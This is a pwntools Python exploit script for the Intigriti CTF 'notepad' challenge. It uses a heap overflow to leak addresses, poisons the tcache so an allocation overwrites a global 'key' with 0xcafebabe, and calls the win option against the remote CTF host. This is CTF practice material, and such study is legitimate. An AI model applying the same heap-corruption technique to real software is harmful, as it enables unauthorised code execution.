#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './notepad_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'notepad.ctf.intigriti.io', 1341

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def create(idx, size, data):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', str(size).encode())
    io.sendlineafter(b'>', data)

def view(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', data)

def remove(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'>', str(idx).encode())

def win():
    io.sendlineafter(b'>', b'5')

def exploit():
    global io
    io = initialize()

    io.recvuntil(b'gift: 0x')
    elf.address =  int(io.recvline().strip(), 16) - elf.symbols['main']
    
    create(0, 0x20, b'A')
    create(1, 0x20, b'A')
    create(2, 0x20, b'A')

    remove(2)
    remove(1)

    edit(0, b'A' * (0x30-2) + b'B')
    view(0)

    io.recvuntil(b'AB\n')
    heap = u64(io.recvline().strip().ljust(8, b'\x00'))
    heap = heap - 0x2d0 - 0x30

    edit(0, b'\x00' * 0x28 + p64(0x31) + p64(elf.sym['key']-0x4-0x8) + p64(0x0))

    create(3, 0x20, b'A')
    create(4, 0x20, b'\x00' * 0xc + p32(0xcafebabe))

    win()

    log.info("elf base: %#x", elf.address)
    log.info("heap base: %#x", heap)
    io.interactive()    
    
if __name__ == '__main__':
    exploit()
